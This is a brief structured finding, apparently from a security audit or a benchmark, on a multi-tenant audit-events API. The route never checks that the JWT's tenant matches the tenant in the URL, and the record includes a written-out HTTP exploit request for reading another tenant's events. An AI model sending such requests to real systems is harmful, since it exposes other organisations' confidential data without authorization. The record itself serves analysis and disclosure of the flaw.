diagnosis: The audit events endpoint uses express-jwt with dynamic JWKS resolution based on token headers, but the route handler extracts tenantSlug from route parameters without checking if req.auth.tenant_slug matches tenantSlug. Any authenticated user holding a valid JWT from Tenant A can query /api/tenants/tenant-b/audit-events and view Tenant B's confidential security events.
exploit_request:
GET /api/tenants/tenant-acme-corp/audit-events HTTP/1.1
Host: audit.enterprisesec.io
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZF90ZW5hbnQiOiJ0ZW5hbnQtc3ViaWRlbnRpdHkifQ...
Accept: application/json
